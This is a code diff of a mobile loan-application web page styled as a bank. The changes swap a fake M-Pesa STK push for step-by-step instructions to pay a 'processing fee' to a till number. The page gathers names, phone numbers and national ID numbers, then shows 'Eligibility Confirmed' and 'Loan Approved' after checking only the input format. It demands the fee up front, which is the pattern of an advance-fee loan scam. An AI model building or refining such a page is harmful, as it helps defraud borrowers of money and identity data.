@@ -37,28 +37,27 @@
             box-sizing: border-box;
         }
 
-body {
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-    background: var(--white);
-    color: var(--text-dark);
-    line-height: 1.6;
-    min-height: 100vh;
-    margin: 0;
-    padding: 0;
-}
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--white);
+            color: var(--text-dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
 
-.bank-container {
-    width: 100vw;
-    height: 100vh;
-    max-width: none;
-    margin: 0;
-    background: var(--white);
-    border-radius: 0;
-    box-shadow: none;
-    overflow-y: auto;
-    position: relative;
-}
-
+        .bank-container {
+            width: 100vw;
+            height: 100vh;
+            max-width: none;
+            margin: 0;
+            background: var(--white);
+            border-radius: 0;
+            box-shadow: none;
+            overflow-y: auto;
+            position: relative;
+        }
 
         /* Bank Header */
         .bank-header {
@@ -126,48 +125,16 @@ body {
             gap: 6px;
         }
 
-        /* Page Container */
-        .page-container {
-            display: none;
-            padding: 0 20px 30px;
-            animation: fadeIn 0.4s ease-out;
-        }
-
-        .page-container.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Page Header */
-        .page-header {
-            padding: 30px 0 20px;
-            text-align: center;
-        }
-
-        .page-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--text-dark);
-            margin-bottom: 8px;
-        }
-
-        .page-subtitle {
-            font-size: 15px;
-            color: var(--text-medium);
-            max-width: 320px;
-            margin: 0 auto;
-        }
-
-        /* Progress Stepper */
+        /* Progress Stepper - Hidden by default */
         .progress-stepper {
-            display: flex;
+            display: none;
             justify-content: space-between;
-            margin: 30px 0 40px;
+            margin: 30px 20px 40px;
             position: relative;
+        }
+
+        .progress-stepper.visible {
+            display: flex;
         }
 
         .progress-stepper::before {
@@ -227,6 +194,42 @@ body {
         .step-label.active {
             color: var(--primary-blue);
             font-weight: 600;
+        }
+
+        /* Page Container */
+        .page-container {
+            display: none;
+            padding: 0 20px 30px;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .page-container.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Page Header */
+        .page-header {
+            padding: 30px 0 20px;
+            text-align: center;
+        }
+
+        .page-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .page-subtitle {
+            font-size: 15px;
+            color: var(--text-medium);
+            max-width: 320px;
+            margin: 0 auto;
         }
 
         /* Card Components */
@@ -461,11 +464,15 @@ body {
         .instruction-step {
             display: flex;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px dashed rgba(10, 102, 194, 0.2);
         }
 
         .instruction-step:last-child {
             margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
         }
 
         .step-number {
@@ -553,18 +560,51 @@ body {
             opacity: 1;
         }
 
-@media (max-width: 500px) {
-    body {
-        padding: 0;
-    }
+        /* Till Number Display */
+        .till-number-display {
+            text-align: center;
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--dark-blue) 100%);
+            color: white;
+            padding: 20px;
+            border-radius: var(--radius-lg);
+            margin: 20px 0;
+            box-shadow: var(--shadow-md);
+        }
 
-    .bank-container {
-        width: 100vw;
-        height: 100vh;
-        border-radius: 0;
-    }
-}
+        .till-label {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+        }
 
+        .till-number {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .till-amount {
+            font-size: 24px;
+            font-weight: 600;
+            margin-top: 12px;
+            background: rgba(255, 255, 255, 0.2);
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 20px;
+        }
+
+        @media (max-width: 500px) {
+            body {
+                padding: 0;
+            }
+
+            .bank-container {
+                width: 100vw;
+                height: 100vh;
+                border-radius: 0;
+            }
+        }
     </style>
 </head>
 <body>
@@ -589,7 +629,7 @@ body {
         </div>
 
         <!-- Progress Stepper -->
-       <div class="progress-stepper hidden" id="progressStepper">
+        <div class="progress-stepper" id="progressStepper">
             <div class="progress-step">
                 <div class="step-indicator" id="step1">1</div>
                 <div class="step-label" id="stepLabel1">Loan Info</div>
@@ -697,25 +737,26 @@ body {
                 <form id="eligibilityForm">
                     <div class="form-group">
                         <label class="form-label" for="fullName">Full Legal Name</label>
-                        <input type="text" class="form-control" id="fullName" placeholder="Enter your full name as per ID" value="Duncan Mutai" required>
+                        <input type="text" class="form-control" id="fullName" placeholder="Enter your full name as per ID" required>
                         <div class="form-note">Must match your national ID card exactly</div>
                     </div>
 
                     <div class="form-group">
                         <label class="form-label" for="phoneNumber">Mobile Number</label>
-                        <input type="tel" class="form-control" id="phoneNumber" placeholder="07XX XXX XXX" value="0745005365" required>
+                        <input type="tel" class="form-control" id="phoneNumber" placeholder="07XX XXX XXX" required>
                         <div class="form-note">Must be registered with M-Pesa</div>
                     </div>
 
                     <div class="form-group">
                         <label class="form-label" for="idNumber">National ID Number</label>
-                        <input type="text" class="form-control" id="idNumber" placeholder="Enter your 8-digit ID number" value="4040404" required>
+                        <input type="text" class="form-control" id="idNumber" placeholder="Enter your 8-digit ID number" required>
                         <div class="form-note">For identity verification purposes</div>
                     </div>
 
                     <div class="form-group">
                         <label class="form-label" for="loanPurpose">Loan Purpose</label>
                         <select class="form-control" id="loanPurpose">
+                            <option value="" disabled selected>Select loan purpose</option>
                             <option value="business">Business Capital</option>
                             <option value="emergency">Emergency Expenses</option>
                             <option value="education">Education Fees</option>
@@ -741,7 +782,7 @@ body {
         <div class="page-container" id="page3">
             <div class="page-header">
                 <h1 class="page-title">Select Loan Amount</h1>
-                <p class="page-subtitle">Hi <strong id="customerName">Duncan Mutai</strong>, you qualify for these loan options based on your M-Pesa transaction history (2-month term at 10% interest)</p>
+                <p class="page-subtitle">Hi <strong id="customerName">Customer</strong>, you qualify for these loan options based on your M-Pesa transaction history (2-month term at 10% interest)</p>
             </div>
 
             <div class="bank-card">
@@ -782,15 +823,15 @@ body {
                 <div class="summary-container">
                     <div class="summary-row">
                         <span class="summary-label">Loan Amount</span>
-                        <span class="summary-value" id="confirmLoanAmount">Ksh 21,200</span>
+                        <span class="summary-value" id="confirmLoanAmount">Ksh 0</span>
                     </div>
                     <div class="summary-row">
                         <span class="summary-label">Processing Fee</span>
-                        <span class="summary-value" id="confirmProcessingFee">Ksh 270</span>
+                        <span class="summary-value" id="confirmProcessingFee">Ksh 0</span>
                     </div>
                     <div class="summary-row">
                         <span class="summary-label">Interest (10%)</span>
-                        <span class="summary-value" id="confirmInterest">Ksh 2,120</span>
+                        <span class="summary-value" id="confirmInterest">Ksh 0</span>
                     </div>
                     <div class="summary-row">
                         <span class="summary-label">Repayment Period</span>
@@ -798,11 +839,11 @@ body {
                     </div>
                     <div class="summary-row">
                         <span class="summary-label">Disbursement Account</span>
-                        <span class="summary-value">M-Pesa: 0745005365</span>
+                        <span class="summary-value" id="confirmPhoneNumber">M-Pesa: --</span>
                     </div>
                     <div class="summary-row">
                         <span class="summary-label">Total Repayment Amount</span>
-                        <span class="summary-value" id="confirmTotalRepayment">Ksh 23,590</span>
+                        <span class="summary-value" id="confirmTotalRepayment">Ksh 0</span>
                     </div>
                 </div>
 
@@ -834,44 +875,78 @@ body {
 
             <div class="status-message">
                 <i class="fas fa-check-circle status-icon"></i>
-                <span>Loan Approved! Processing fee: <span id="paymentAmount">Ksh 270</span></span>
+                <span>Loan Approved! Processing fee: <span id="paymentAmount">Ksh 0</span></span>
+            </div>
+
+            <div class="till-number-display">
+                <div class="till-label">Payment Till Number:</div>
+                <div class="till-number">987654</div>
+                <div class="till-amount" id="tillAmountDisplay">Ksh 0</div>
             </div>
 
             <div class="bank-card">
                 <div class="card-header">
-                    <div class="card-title">M-Pesa Payment Instructions</div>
-                    <div class="card-subtitle">Follow these steps to complete payment</div>
+                    <div class="card-title">Steps to Complete Your Payment</div>
+                    <div class="card-subtitle">Follow these steps to complete payment via M-Pesa</div>
                 </div>
 
                 <div class="payment-instructions">
                     <div class="instruction-step">
                         <div class="step-number">1</div>
                         <div>
-                            <div style="font-weight: 600; color: var(--text-dark);">Check your phone</div>
-                            <div style="font-size: 14px; color: var(--text-medium);">An M-Pesa STK Push request has been sent to 0745005365</div>
+                            <div style="font-weight: 600; color: var(--text-dark);">Go to M-Pesa on your phone</div>
+                            <div style="font-size: 14px; color: var(--text-medium);">Open the M-Pesa menu on your mobile phone</div>
                         </div>
                     </div>
                     <div class="instruction-step">
                         <div class="step-number">2</div>
                         <div>
-                            <div style="font-weight: 600; color: var(--text-dark);">Enter your M-Pesa PIN</div>
-                            <div style="font-size: 14px; color: var(--text-medium);">Authorize payment to "Nyota Youth Empowerment"</div>
+                            <div style="font-weight: 600; color: var(--text-dark);">Select Lipa na M-Pesa</div>
+                            <div style="font-size: 14px; color: var(--text-medium);">Choose "Lipa na M-Pesa" from the main menu</div>
                         </div>
                     </div>
                     <div class="instruction-step">
                         <div class="step-number">3</div>
                         <div>
-                            <div style="font-weight: 600; color: var(--text-dark);">Wait for confirmation</div>
-                            <div style="font-size: 14px; color: var(--text-medium);">You will receive SMS confirmation and loan disbursement</div>
+                            <div style="font-weight: 600; color: var(--text-dark);">Select Buy Goods and Services</div>
+                            <div style="font-size: 14px; color: var(--text-medium);">Choose "Buy Goods and Services" option</div>
+                        </div>
+                    </div>
+                    <div class="instruction-step">
+                        <div class="step-number">4</div>
+                        <div>
+                            <div style="font-weight: 600; color: var(--text-dark);">Enter the Till Number above</div>
+                            <div style="font-size: 14px; color: var(--text-medium);">Enter Till Number: <strong>987654</strong></div>
+                        </div>
+                    </div>
+                    <div class="instruction-step">
+                        <div class="step-number">5</div>
+                        <div>
+                            <div style="font-weight: 600; color: var(--text-dark);">Enter the Amount: Ksh <span id="stepAmount">0</span></div>
+                            <div style="font-size: 14px; color: var(--text-medium);">Enter the exact amount shown above</div>
+                        </div>
+                    </div>
+                    <div class="instruction-step">
+                        <div class="step-number">6</div>
+                        <div>
+                            <div style="font-weight: 600; color: var(--text-dark);">Enter your M-Pesa PIN</div>
+                            <div style="font-size: 14px; color: var(--text-medium);">Enter your secure M-Pesa PIN to authorize payment</div>
+                        </div>
+                    </div>
+                    <div class="instruction-step">
+                        <div class="step-number">7</div>
+                        <div>
+                            <div style="font-weight: 600; color: var(--text-dark);">Confirm and send payment</div>
+                            <div style="font-size: 14px; color: var(--text-medium);">Review and confirm the payment details</div>
                         </div>
                     </div>
                 </div>
 
                 <div style="text-align: center; padding: 20px 0;">
                     <div style="font-size: 14px; color: var(--text-medium); margin-bottom: 10px;">Payment Status</div>
-                    <div style="display: inline-flex; align-items: center; background: var(--success-green); color: white; padding: 8px 16px; border-radius: 20px; font-weight: 600;">
-                        <i class="fas fa-check" style="margin-right: 8px;"></i>
-                        STK Push Successful
+                    <div style="display: inline-flex; align-items: center; background: var(--warning-orange); color: white; padding: 8px 16px; border-radius: 20px; font-weight: 600;">
+                        <i class="fas fa-clock" style="margin-right: 8px;"></i>
+                        Awaiting Payment
                     </div>
                 </div>
             </div>
@@ -931,6 +1006,7 @@ body {
         const stepLabels = document.querySelectorAll('.step-label');
         const loanOptionsContainer = document.getElementById('loanOptions');
         const notification = document.getElementById('notification');
+        const progressStepper = document.getElementById('progressStepper');
         
         // Buttons
         const applyNowBtn = document.getElementById('applyNowBtn');
@@ -945,13 +1021,22 @@ body {
         const backToHome2Btn = document.getElementById('backToHome2Btn');
         const backToHome4Btn = document.getElementById('backToHome4Btn');
         
-        // Customer name display
-        const customerNameDisplay = document.getElementById('customerName');
+        // Form fields
         const fullNameInput = document.getElementById('fullName');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const idNumberInput = document.getElementById('idNumber');
+        const loanPurposeSelect = document.getElementById('loanPurpose');
+        
+        // Display elements
+        const customerNameDisplay = document.getElementById('customerName');
+        const confirmPhoneNumberDisplay = document.getElementById('confirmPhoneNumber');
+        const tillAmountDisplay = document.getElementById('tillAmountDisplay');
+        const stepAmountDisplay = document.getElementById('stepAmount');
         
         // Selected loan storage
         let selectedLoan = null;
         let currentPage = 1;
+        let customerPhoneNumber = '';
 
         // Initialize application
         function init() {
@@ -960,7 +1045,7 @@ body {
             
             // Set up event listeners
             applyNowBtn.addEventListener('click', () => navigateToPage(2));
-            checkEligibilityBtn.addEventListener('click', () => navigateToPage(3));
+            checkEligibilityBtn.addEventListener('click', checkEligibility);
             getLoanBtn.addEventListener('click', () => navigateToPage(4));
             proceedBtn.addEventListener('click', () => navigateToPage(5));
             cancelBtn.addEventListener('click', () => navigateToPage(3));
@@ -980,13 +1065,53 @@ body {
                 customerNameDisplay.textContent = this.value || 'Customer';
             });
             
+            // Phone number update
+            phoneNumberInput.addEventListener('input', function() {
+                customerPhoneNumber = this.value;
+                confirmPhoneNumberDisplay.textContent = `M-Pesa: ${this.value || '--'}`;
+            });
+            
             // Login button
             document.getElementById('loginBtn').addEventListener('click', function() {
                 showNotification('Login Required', 'Please use the official banking app for existing customers');
             });
+        }
+
+        // Check eligibility function
+        function checkEligibility() {
+            // Get form values
+            const fullName = fullNameInput.value.trim();
+            const phoneNumber = phoneNumberInput.value.trim();
+            const idNumber = idNumberInput.value.trim();
+            const loanPurpose = loanPurposeSelect.value;
             
-            // Initialize with first page
-            updateProgressIndicator(1);
+            // Validate form
+            if (!fullName || !phoneNumber || !idNumber || !loanPurpose) {
+                showNotification('Missing Information', 'Please fill in all required fields');
+                return;
+            }
+            
+            // Validate phone number format
+            if (!/^07\d{8}$/.test(phoneNumber)) {
+                showNotification('Invalid Phone Number', 'Please enter a valid 10-digit M-Pesa number starting with 07');
+                return;
+            }
+            
+            // Validate ID number
+            if (!/^\d{8}$/.test(idNumber)) {
+                showNotification('Invalid ID Number', 'Please enter a valid 8-digit national ID number');
+                return;
+            }
+            
+            // Store customer phone number
+            customerPhoneNumber = phoneNumber;
+            confirmPhoneNumberDisplay.textContent = `M-Pesa: ${phoneNumber}`;
+            
+            // Navigate to loan selection page
+            navigateToPage(3);
+            
+            // Show success notification
+            showNotification('Eligibility Confirmed', 'Based on your M-Pesa history, you qualify for multiple loan options');
         }
 
         // Generate professional loan options
@@ -1042,6 +1167,8 @@ body {
             document.getElementById('confirmInterest').textContent = `Ksh ${loan.interest.toLocaleString()}`;
             document.getElementById('confirmTotalRepayment').textContent = `Ksh ${loan.total.toLocaleString()}`;
             document.getElementById('paymentAmount').textContent = `Ksh ${loan.fee.toLocaleString()}`;
+            document.getElementById('tillAmountDisplay').textContent = `Ksh ${loan.fee.toLocaleString()}`;
+            document.getElementById('stepAmount').textContent = loan.fee.toLocaleString();
         }
 
         // Navigate between pages
@@ -1070,58 +1197,56 @@ body {
             window.scrollTo(0, 0);
             
             // Show appropriate notification
-            if (pageNumber === 3) {
-                showNotification('Eligibility Confirmed', 'Based on your M-Pesa history, you qualify for multiple loan options');
-            } else if (pageNumber === 5) {
-                showNotification('Payment Initiated', 'M-Pesa STK Push request has been sent to your phone');
+            if (pageNumber === 5 && selectedLoan) {
+                showNotification('Payment Instructions', 'Follow the steps below to complete payment via M-Pesa');
             }
         }
 
-function updateProgressIndicator(pageNumber) {
-    const stepper = document.getElementById('progressStepper');
-
-    // Page 1 = main menu → hide stepper
-    if (pageNumber === 1) {
-        stepper.classList.add('hidden');
-        return;
-    }
-
-    // Show stepper from Apply Now page
-    stepper.classList.remove('hidden');
-
-    // Map pages to steps
-    const stepMap = {
-        2: 1, // Apply Now → Step 1
-        3: 2, // Eligibility → Step 2
-        4: 3, // Select Loan → Step 3
-        5: 4  // Confirm + Payment → Step 4/5 handled below
-    };
-
-    let activeStep = stepMap[pageNumber] || 1;
-
-    // Reset indicators
-    stepIndicators.forEach(indicator => {
-        indicator.classList.remove('active', 'completed');
-    });
-
-    stepLabels.forEach(label => {
-        label.classList.remove('active');
-    });
-
-    // Activate correct steps
-    for (let i = 1; i <= activeStep; i++) {
-        const indicator = document.getElementById(`step${i}`);
-        const label = document.getElementById(`stepLabel${i}`);
-
-        if (i < activeStep) {
-            indicator.classList.add('completed');
-        } else {
-            indicator.classList.add('active');
+        // Update progress indicator
+        function updateProgressIndicator(pageNumber) {
+            // Hide stepper on page 1 (main menu)
+            if (pageNumber === 1) {
+                progressStepper.classList.remove('visible');
+                return;
+            }
+            
+            // Show stepper from page 2 onwards
+            progressStepper.classList.add('visible');
+            
+            // Map pages to steps (starting from step 1 on page 2)
+            const stepMap = {
+                2: 1, // Apply Now → Step 1
+                3: 2, // Eligibility → Step 2
+                4: 3, // Select Loan → Step 3
+                5: 4  // Confirm + Payment → Step 4
+            };
+            
+            let activeStep = stepMap[pageNumber] || 1;
+            
+            // Reset indicators
+            stepIndicators.forEach(indicator => {
+                indicator.classList.remove('active', 'completed');
+            });
+            
+            stepLabels.forEach(label => {
+                label.classList.remove('active');
+            });
+            
+            // Activate correct steps
+            for (let i = 1; i <= 5; i++) {
+                const indicator = document.getElementById(`step${i}`);
+                const label = document.getElementById(`stepLabel${i}`);
+                
+                if (i < activeStep) {
+                    indicator.classList.add('completed');
+                    label.classList.add('active');
+                } else if (i === activeStep) {
+                    indicator.classList.add('active');
+                    label.classList.add('active');
+                }
+            }
         }
 
-        label.classList.add('active');
-    }
-}
         // Show notification
         function showNotification(title, message) {
             document.getElementById('notificationTitle').textContent = title;
